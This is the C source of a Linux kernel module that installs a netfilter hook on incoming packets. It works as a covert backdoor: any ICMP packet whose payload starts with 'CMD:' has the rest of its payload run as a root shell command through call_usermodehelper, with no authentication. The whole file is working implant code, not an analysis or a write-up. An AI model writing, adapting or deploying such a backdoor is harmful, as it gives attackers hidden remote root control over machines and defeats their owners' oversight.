#include <linux/module.h>     /* Needed by all modules */
#include <linux/kernel.h>     /* Needed for KERN_INFO */
#include <linux/init.h>       /* Needed for the macros */
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

///< The license type -- this affects runtime behavior
MODULE_LICENSE("GPL");
///< The version of the module
MODULE_VERSION("0.1");
  
#define MaxCmdLen 128
// request包的结构
struct icmp_echo {
    // header
    uint8_t type;
    uint8_t code;
    uint16_t checksum;

    uint16_t ident;
    uint16_t seq;

    // data
    double sending_ts;
    char magic[MaxCmdLen];
};


static char * envp[] = { "HOME=/", NULL };
static char * argv[] = { "/bin/sh","-c","/usr/bin/ls -la > /tmp/3qrfaf.txt",NULL};

static struct nf_hook_ops hook;

/* dump packet's data */
void pkt_hex_dump(struct sk_buff *skb){
    size_t len;
    int rowsize = 16;
    int i, l, linelen, remaining;
    int li = 0;
    uint8_t *data, ch; 
    struct iphdr *ip = (struct iphdr *)skb_network_header(skb);

    printk("Packet hex dump:\n");
    data = (uint8_t *) skb_network_header(skb);

    len=ntohs(ip->tot_len);

    remaining = len;
    for (i = 0; i < len; i += rowsize) {
        printk("%06d\t", li);
        linelen = min(remaining, rowsize);
        remaining -= rowsize;
        for (l = 0; l < linelen; l++) {
            ch = data[l];
            printk(KERN_CONT "%02X ", (uint32_t) ch);
        }
        data += linelen;
        li += 10; 
        printk(KERN_CONT "\n");
    }
}

static char magic[5]="CMD:";

/* This is the hook function itself */
unsigned int watch_in(void *priv,
        struct sk_buff *skb,
        const struct nf_hook_state *state)
{
    int offset=16;
    struct iphdr *ip = NULL;
    struct icmp_echo *icmppkt =NULL;
    char * data = NULL;
    int icmp_payload_len;
    ip = (struct iphdr *)skb_network_header(skb);
    if (ip->protocol != IPPROTO_ICMP){
        return NF_ACCEPT;
    }
    // get payload
    icmppkt=(struct icmp_echo*)((char *)ip+(ip->ihl<<2));
    
    data=(char* )icmppkt+offset;
    icmp_payload_len = ntohs(ip->tot_len) - (ip->ihl<<2) - offset; 

    printk("data is %s\n",data);
//    pid_t pid;
    if(strncmp(data,magic,strlen(magic))==0){
        argv[2]=data+strlen(magic);
        printk("strncpy argv2:%s\n",argv[2]);
        call_usermodehelper(argv[0], argv, envp,UMH_NO_WAIT);
   }
    return NF_ACCEPT;
}


static int __init client_start(void)
{
    /* Fill in our hook structure */
    hook.hook = watch_in;        /* Handler function */
    hook.hooknum  = NF_INET_LOCAL_IN; //路由判断得到如果是发往本机的
    hook.pf       = AF_INET;
    hook.priority = NF_IP_PRI_FIRST;   /* Make our function first */

    nf_register_net_hook(&init_net, &hook);
    printk("Loading module...\n");
    return 0;
}

static void __exit clinet_end(void)
{
    printk("Goodbye Mr.\n");
    nf_unregister_net_hook(&init_net,&hook);
}
module_init(client_start);
module_exit(clinet_end);
